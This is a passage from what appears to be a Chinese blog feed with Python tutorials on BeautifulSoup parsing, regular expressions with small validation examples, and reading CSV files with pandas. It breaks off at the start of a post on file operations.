story&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;class &#39;bs4.element.Tag&#39;&gt;</span><br></pre></td></tr></table></figure><p>我们可以利用 soup 加标签名轻松地获取这些标签的内容，这些对象的类型是bs4.element.Tag。但是注意，它查找的是在所有内容中的第一个符合要求的标签。如果要查询所有的标签，后面会进行介绍。</p><h5 id="Tag的两个重要的属性"><a href="#Tag的两个重要的属性" class="headerlink" title="Tag的两个重要的属性"></a>Tag的两个重要的属性</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">print soup.name</span><br><span class="line"># [document] #soup 对象本身比较特殊，它的 name 即为 [document]</span><br><span class="line"></span><br><span class="line">print soup.head.name</span><br><span class="line"># head #对于其他内部标签，输出的值便为标签本身的名称</span><br><span class="line"></span><br><span class="line">print soup.p.attrs</span><br><span class="line"># &#123;&#39;class&#39;: [&#39;title&#39;], &#39;name&#39;: &#39;dromouse&#39;&#125;</span><br><span class="line"># 在这里，我们把 p 标签的所有属性打印输出了出来，得到的类型是一个字典。</span><br><span class="line"></span><br><span class="line">print soup.p[&#39;class&#39;] # soup.p.get(&#39;class&#39;)</span><br><span class="line"># [&#39;title&#39;] #还可以利用get方法，传入属性的名称，二者是等价的</span><br><span class="line"></span><br><span class="line">soup.p[&#39;class&#39;] &#x3D; &quot;newClass&quot;</span><br><span class="line">print soup.p # 可以对这些属性和内容等等进行修改</span><br><span class="line"># &lt;p class&#x3D;&quot;newClass&quot; name&#x3D;&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><h5 id="NavigableString"><a href="#NavigableString" class="headerlink" title="NavigableString"></a>NavigableString</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如果拿到标签后，还想获取标签中的内容。那么可以通过tag.string获取标签中的文字。示例代码如下：</span><br><span class="line"></span><br><span class="line">print soup.p.string</span><br><span class="line"># The Dormouse&#39;s story</span><br><span class="line"></span><br><span class="line">print type(soup.p.string)</span><br><span class="line"># &lt;class &#39;bs4.element.NavigableString&#39;&gt;thon</span><br></pre></td></tr></table></figure><h5 id="搜索文档树"><a href="#搜索文档树" class="headerlink" title="搜索文档树"></a>搜索文档树</h5><h6 id="find和find-all方法"><a href="#find和find-all方法" class="headerlink" title="find和find_all方法"></a>find和find_all方法</h6><p>搜索文档树，一般用得比较多的就是两个方法，一个是<code>find</code>，一个是<code>find_all</code>。<code>find</code>方法是找到第一个满足条件的标签后就立即返回，只返回一个元素。<code>find_all</code>方法是把所有满足条件的标签都选到，然后返回回去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(&quot;a&quot;,attrs&#x3D;&#123;&quot;id&quot;:&quot;link2&quot;&#125;)</span><br><span class="line">或者是直接传入属性的的名字作为关键字参数：</span><br><span class="line">soup.find_all(&quot;a&quot;,id&#x3D;&#39;link2&#39;)</span><br></pre></td></tr></table></figure><h6 id="select方法"><a href="#select方法" class="headerlink" title="select方法"></a>select方法</h6><p>使用以上方法可以方便的找出元素。但有时候使用<code>css</code>选择器的方式可以更加的方便。使用<code>css</code>选择器的语法，应该使用<code>select</code>方法。以下列出几种常用的<code>css</code>选择器方法：</p><p>（1）通过标签名查找：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&#x27;a&#x27;</span>))</span><br></pre></td></tr></table></figure><p>（2）通过类名查找：</p><p>通过类名，则应该在类的前面加一个<code>.</code>。比如要查找<code>class=sister</code>的标签。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&#x27;.sister&#x27;</span>))</span><br></pre></td></tr></table></figure><p>（3）通过id查找：</p><p>通过id查找，应该在id的名字前面加一个＃号。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&quot;#link1&quot;</span>))</span><br></pre></td></tr></table></figure><p>（4）组合查找：</p><p>组合查找即和写 class 文件时，标签名与类名、id名进行的组合原理是一样的，例如查找 p 标签中，id 等于 link1的内容，二者需要用空格分开：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&quot;p #link1&quot;</span>))</span><br></pre></td></tr></table></figure><p>直接子标签查找，则使用 &gt; 分隔：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&quot;head &gt; title&quot;</span>))</span><br></pre></td></tr></table></figure><p>（5）通过属性查找：</p><p>查找时还可以加入属性元素，属性需要用中括号括起来，注意属性和标签属于同一节点，所以中间不能加空格，否则会无法匹配到。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&#x27;a[href=&quot;http://example.com/elsie&quot;]&#x27;</span>))</span><br></pre></td></tr></table></figure><p>（6）获取内容</p><p>以上的 select 方法返回的结果都是列表形式，可以遍历形式输出，然后用 get_text() 方法来获取它的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> type(soup.select(<span class="string">&#x27;title&#x27;</span>))</span><br><span class="line"><span class="keyword">print</span> soup.select(<span class="string">&#x27;title&#x27;</span>)[<span class="number">0</span>].get_text()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> title <span class="keyword">in</span> soup.select(<span class="string">&#x27;title&#x27;</span>):</span><br><span class="line">    <span class="keyword">print</span> title.get_text()</span><br></pre></td></tr></table></figure><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h4 id="数量词"><a href="#数量词" class="headerlink" title="数量词"></a><strong>数量词</strong></h4><ul><li>**{n}**——作用于前一个字符或子表达式，匹配它重复n次</li><li>**{min,max}**——作用于前一个字符或子表达式，匹配它重复重复多少次min~max次，min和max可只写一个设置重复下限或上限，但逗号不能省，不写min时min默认为0</li><li>*****——星号，作用于前一个字符或子表达式，匹配它零次或多次</li><li>**+**——作用于前一个字符或子表达式，匹配它至少一次</li><li>**?**——作用于前一个字符或子表达式，匹配它零次或一次</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r&#39;z&#123;3&#125;&#39;#匹配zzz</span><br><span class="line">r&#39;z&#123;0,3&#125;&#39;#匹配z或zz或zzz</span><br><span class="line">r&#39;(?:abc)&#123;2&#125;&#39;#对子表达式匹配两次，匹配abcabc，(?:)是一个用法，不分组的意思，详看后面</span><br><span class="line">#星号加号问号同理</span><br></pre></td></tr></table></figure><h4 id="预定字符集"><a href="#预定字符集" class="headerlink" title="预定字符集"></a><strong>预定字符集</strong></h4><ul><li><strong>\d</strong>——匹配任一个数字（0~9）</li><li><strong>\D</strong>——匹配一个非数字字符，与\d互补</li><li><strong>\s</strong>——匹配一个空白字符，包括空格，\t,\n,\r,\n,\f,\v</li><li><strong>\S</strong>——匹配一个非空白字符</li><li><strong>\w</strong>——匹配一个单词字符。unicode下匹配各种语言的单个字符，单个数字，和下横线。ASCII下匹配单个英文字母，单个数字，和下横线</li><li><strong>\W</strong>——匹配一个非单词字符</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r&#39;\w&#39; #能匹配&#39;物语&amp;ものがたり&#39;中的：物，语，も，の，が，た，り，汉语日语的单字，其他语言同理</span><br></pre></td></tr></table></figure><h4 id="分组-amp-或-amp-转义"><a href="#分组-amp-或-amp-转义" class="headerlink" title="分组&amp;或&amp;转义"></a><strong>分组&amp;或&amp;转义</strong></h4><ul><li>**()**——括号，表达式分组（第n组，n=1，2，3….99，从左往右数），并形成子表达式</li><li>(?P<name>)——拥有括号的功能，但能为该分组再指定一个自定名字</li><li>(?P=name)——引用分配过名字的分组，但没有分组功能</li><li>**|**——或，左右规则任意匹配一个，从左往右尝试匹配，一旦成功就跳过后面的规则。|没被包在括号中间的话它的作用域是整个表达式，被包的话作用域在括号内</li><li><strong>\</strong>——反斜杠，后接功能字有符转义功能，后接数字（1到99）有引用分组的功能，后接某些字母又有特殊功能</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r&#39;abc|def|ghi&#39;#匹配abc或def或ghi</span><br><span class="line">r&#39;ma(?:k|d)e&#39;#匹配make或made</span><br><span class="line">r&#39;(abc)def\1&#39;#相当于r&#39;(abc)defabc&#39;,匹配abcdefabc</span><br><span class="line">r&#39;(?P&lt;ok&gt;abc)f(?P&#x3D;ok)&#39;#为(abc)子组分配了“ok”的名字，然后再引用，匹配abcfabc</span><br></pre></td></tr></table></figure><h4 id="边界匹配"><a href="#边界匹配" class="headerlink" title="边界匹配"></a><strong>边界匹配</strong></h4><ul><li>^——放在表达式的最前面，作用域是表达式，在多行模式中，在每一行匹配字符串开头（多行模式要手动开启，否则和\A没什么区别）</li><li>$——放在表达式的最后面，作用域是表达式，在多行模式中，在每一行匹配字符串末尾（多行模式要手动开启，否则和\Z没什么区别）</li><li>\A——放在表达式的最前面，作用域是表达式，匹配字符串开头，不能多行匹配</li><li>\Z——放在表达式的最后面，作用域是表达式，匹配字符串末尾，不能多行匹配</li><li>\b——不匹配字符，只匹配一个边界，匹配\w和\W或\W和\w的边界（单词字符和非单词字符的边界）</li><li>\B——不匹配字符，只匹配一个边界，与\b相反，匹配\w和\w或\W和\W的边界</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r&#39;^abc|^def&#39;#匹配abc开头或def开头，开启了多行模式时，对字符串&#39;abcd\ndefh&#39;能匹配出abc，def两个</span><br><span class="line">r&#39;abc$|def$&#39;#匹配abc结尾或def结尾，开启了多行模式时，对字符串&#39;0abc\n0def&#39;能匹配出abc，def两个</span><br><span class="line">r&#39;\Aabc&#39;#匹配abc开头，因为不能多行匹配，就算开启多行模式，对字符串&#39;abcd\nabcd&#39;只能匹配到前面的abc</span><br><span class="line">#\Z同理</span><br><span class="line">r&#39;\w\b\W&#39;#匹配“单词字符+非单词字符”的结构如&#39;a!&#39;,&#39;1%&#39;</span><br><span class="line">#\B同理</span><br></pre></td></tr></table></figure><h4 id="re模块中的函数"><a href="#re模块中的函数" class="headerlink" title="re模块中的函数"></a>re模块中的函数</h4><h5 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a>re.match函数</h5><p>match 方法用于查找字符串的头部（也可以指定起始位置），它是一次匹配，只要找到了一个匹配的结果就返回，而不是查找所有匹配的结果。</p><p>一次匹配，只要找到就返回找到的结果。</p><h5 id="re-findall函数"><a href="#re-findall函数" class="headerlink" title="re.findall函数"></a>re.findall函数</h5><p>找出所有满足条件的，返回的是一个列表。</p><p>match 和 search 方法都是一次匹配，只要找到了一个匹配的结果就返回。然而，在大多数时候，我们需要搜索整个字符串，获得所有匹配的结果。</p><h5 id="re-sub函数"><a href="#re-sub函数" class="headerlink" title="re.sub函数"></a>re.sub函数</h5><p>用来替换字符串。将匹配到的字符串替换为其他字符串。</p><h4 id="取回匹配的数据"><a href="#取回匹配的数据" class="headerlink" title="取回匹配的数据"></a>取回匹配的数据</h4><p>在正则表达式中，可以对过滤到的字符串进行分组。分组使用圆括号的方式。将每一个正则表达式使用括号括起来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">group()：和group(0)是等价的，返回的是整个满足条件的字符串。</span><br><span class="line">groups()：返回的是里面的子组。索引从1开始。</span><br><span class="line">group(n)：返回的是第一个子组，可以传入多个。</span><br></pre></td></tr></table></figure><h4 id="r"><a href="#r" class="headerlink" title="r"></a>r</h4><p> Python中字符串前面加上 r 表示原生字符串 。</p><h4 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h4><p>贪婪模式：正则表达式会匹配尽量多的字符。默认是贪婪模式。</p><p>非贪婪模式：正则表达式会尽量少的匹配字符。</p><p>贪婪模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;&lt;div class&#x3D;&quot;cont&quot;&gt;.*&lt;b&gt;(.*)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL)</span><br></pre></td></tr></table></figure><p>非贪婪模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;&lt;div class&#x3D;&quot;cont&quot;&gt;.*?&lt;b&gt;(.*)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL)</span><br></pre></td></tr></table></figure><p>可以看到非贪婪模式使用?表示只匹配一次或者匹配零次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text=<span class="string">&#x27;&lt;div class=&quot;cont&quot;&gt;&lt;p&gt;sdf&lt;/p&gt;&lt;b&gt;steady&lt;/b&gt;&lt;b&gt;s1eady&lt;/b&gt;&#x27;</span></span><br><span class="line">print(text)</span><br><span class="line">resault=re.findall(<span class="string">r&#x27;&lt;div class=&quot;cont&quot;&gt;.*&lt;b&gt;(.*?)&lt;/b&gt;&#x27;</span>,text,re.DOTALL)</span><br><span class="line">print(<span class="string">&quot;贪婪模式&quot;</span> + str(resault))</span><br><span class="line">resault=re.findall(<span class="string">r&#x27;&lt;div class=&quot;cont&quot;&gt;.*?&lt;b&gt;(.*?)&lt;/b&gt;&#x27;</span>,text,re.DOTALL)</span><br><span class="line">print(<span class="string">&quot;非贪婪模式&quot;</span> + str(resault))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">贪婪模式[&#39;s1eady&#39;]</span><br><span class="line">非贪婪模式[&#39;steady&#39;]</span><br></pre></td></tr></table></figure><p>可以看到主要是使用?匹配一次或者零次，来阻止贪婪模式。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;steady&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;[e]&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/Users/apple/Desktop/steady.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    print(resault.group())</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> object has no attribute <span class="string">&#x27;group&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;steady&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;[s]&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;[\d]*&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7667</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;\d+&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7667</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;\d?&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;\d&#123;3&#125;&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">766</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;\d&#123;0,10&#125;&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7667</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;^76&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">76</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;^763&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/Users/apple/Desktop/steady.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    print(resault.group())</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> object has no attribute <span class="string">&#x27;group&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="小案例"><a href="#小案例" class="headerlink" title="小案例"></a>小案例</h4><p>身份证</p><p>前17位必须是数字，后一位可以是数字或者x或者X。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">lists = [<span class="string">&#x27;370787199927261616&#x27;</span>,<span class="string">&#x27;370787199927261614&#x27;</span>,<span class="string">&#x27;3707871999272616SS&#x27;</span>,<span class="string">&#x27;37078719992726162X&#x27;</span>,<span class="string">&#x27;37078719992726D616&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lists:</span><br><span class="line">    resault=re.match(<span class="string">&#x27;\d&#123;17&#125;[\dxX]&#x27;</span>,l)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(resault.group())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>手机号</p><p>第一位必须是1，一共十一位，无字母。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">lists = [<span class="string">&#x27;19862123063&#x27;</span>,<span class="string">&#x27;29862123063&#x27;</span>,<span class="string">&#x27;198df123063&#x27;</span>,<span class="string">&#x27;1986212d063&#x27;</span>,<span class="string">&#x27;198621230dd&#x27;</span>,<span class="string">&#x27;1987261267171&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lists:</span><br><span class="line">    resault=re.match(<span class="string">&#x27;1\d&#123;10&#125;&#x27;</span>,l)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(resault.group())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>网站URL</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">lists = [<span class="string">&#x27;http://www.steady.com&#x27;</span>,<span class="string">&#x27;https://www.steady.com&#x27;</span>,<span class="string">&#x27;http:/www.steady.com&#x27;</span>,<span class="string">&#x27;http://www.steady.top&#x27;</span>,<span class="string">&#x27;http://ww.ls.com&#x27;</span>,<span class="string">&#x27;http://www.dd.com&#x27;</span>,<span class="string">&#x27;ftp://www.steady.com&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lists:</span><br><span class="line">    resault=re.match(<span class="string">&#x27;(ftp|http|https)://.*.(com|top)$&#x27;</span>,l)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(resault.group())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="csv文件处理"><a href="#csv文件处理" class="headerlink" title="csv文件处理"></a>csv文件处理</h3><h5 id="读取csv文件"><a href="#读取csv文件" class="headerlink" title="读取csv文件"></a>读取csv文件</h5><p>表头不作为第一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">data &#x3D; pd.read_csv(&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;huazhu.com.csv&quot;)</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>表头作为第一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">data &#x3D; pd.read_csv(&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;huazhu.com.csv&quot;,header&#x3D;None)</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p>获取指定列的数据，并存入一个数组中。</p><p>从文件中取出url并写入一个文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">data = pd.read_csv(<span class="string">&quot;/Users/apple/Desktop/huazhu.com.csv&quot;</span>)</span><br><span class="line">url = data[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">url_list = np.array(url)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Desktop/huazhu_url.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">        print(i)</span><br><span class="line">        fp.write(i+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Python爬虫&quot;&gt;&lt;a href=&quot;#Python爬虫&quot; class=&quot;headerlink&quot; title=&quot;Python爬虫&quot;&gt;&lt;/a&gt;Python爬虫&lt;/h3&gt;&lt;h3 id=&quot;Requests库&quot;&gt;&lt;a href=&quot;#Requests库&quot; class=&quot;he</summary>
      
    
    
    
    <category term="Python学习" scheme="http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Python" scheme="http://s1eady.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习--Python文件操作</title>
    <link href="http://s1eady.top/2018/12/02/Python%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <id>http://s1eady.top/2018/12/02/Python%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</id>
    <published>2018-12-01T19:22:45.000Z</published>
    <updated>2020-10-16T11:36:51.765Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Python文件操作"><a href="#Python文件操作" class="headerlink" title="Python文件操作"></a>Python文件操作</h3><h4 id="Python中文件数据的读和写"><a href="#Python中文件数据的读和写" class="headerlink" title="Python中文件数据的读和写"></a>Python中文件数据的读和写</h4><h5 id="open-方法"><a href="#open-方法" class="headerlink" title="open()方法"></a>open()方法</h5><p>两个参数</p><p>mode(模式)和encoding(编码)。</p><ul><li><p>encoding一般来说，打开文件的编码方式以操作系统的默认编码为准，中文可能会出现乱码，需要加encoding=’utf-8’。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.txt&#39;,&#39;r&#39;,encoding&#x3D;&#39;utf-8&#39;) as fp:</span><br><span class="line">    a&#x3D;fp.readlines()</span><br><span class="line">    print(a)</span><br></pre></td></tr></table></figure></li><li><p>mode，它指定文件打开的模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 